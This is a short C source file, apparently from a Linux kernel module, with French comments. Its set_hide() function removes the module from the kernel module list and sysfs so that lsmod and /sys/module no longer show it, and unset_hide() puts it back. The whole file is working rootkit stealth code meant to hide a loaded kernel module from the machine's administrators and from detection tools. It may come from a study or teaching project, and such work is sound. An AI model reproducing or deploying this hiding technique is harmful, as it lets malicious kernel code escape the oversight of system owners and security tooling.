#include <linux/module.h>
#include <linux/list.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include "hide.h"

static int hidden = 0;
static struct list_head *prev_module;
static struct kobject   *prev_kobj_parent;

int set_hide(void)
{
    if (hidden) {
        printk(KERN_INFO "deja caché non?\n");
        return -1;
    }

    /* cache de lsmod (/proc/modules) */
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);

    /* cache de /sys/module/ */
    prev_kobj_parent = THIS_MODULE->mkobj.kobj.parent;
    kobject_del(&THIS_MODULE->mkobj.kobj);

    hidden = 1;
    printk(KERN_INFO "module caché (lsmod + sysfs)\n");
    return 0;
}

int unset_hide(void)
{
    int ret;

    if (!hidden) {
        printk(KERN_INFO "il etait meme pas caché\n");
        return -1;
    }

    /* remet dans lsmod */
    list_add(&THIS_MODULE->list, prev_module);

    /* remet dans /sys/module/ */
    ret = kobject_add(&THIS_MODULE->mkobj.kobj, prev_kobj_parent,
                      "%s", THIS_MODULE->name);
    if (ret)
        printk(KERN_WARNING "kobject_add échoué (%d), sysfs pas restauré\n", ret);

    hidden = 0;
    printk(KERN_INFO "module visible maintenant\n");
    return 0;
}
